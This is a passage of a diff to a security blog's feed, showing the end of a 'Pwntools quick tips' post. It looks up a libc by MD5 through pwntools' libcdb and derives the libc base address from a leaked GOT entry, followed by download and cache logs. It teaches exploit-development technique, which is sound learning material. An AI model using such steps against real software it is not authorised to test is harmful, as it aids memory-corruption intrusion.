+    dl_libc <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>search_by_md5(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">50390b2ae8aaa73c47745040f54e602f</span><span style="color:#e6db74">&#34;</span>)
+    libc <span style="color:#f92672">=</span> ELF(dl_libc)
+
+libc_base <span style="color:#f92672">=</span> leaked_got_read  <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read
+</code></pre></div><p>Debug log output during script execution shows that pwntools is handling the file download and
+caching for you.</p>
+<p>First run:</p>
+<pre><code class="language-log" data-lang="log">[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f
+[+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f': 70B
+
+[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so
+[+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so': 1.94MB
+</code></pre><p>Second run:</p>
+<pre><code class="language-log" data-lang="log">[DEBUG] Found existing cached libc at '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
+[*] Using cached data from '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
+</code></pre><p>That's all for today's Pwntools quick tips!</p>
+]]></content>
+        </item>
         
         <item>
             <title>Abusing Signals with SIGROP Exploits</title>
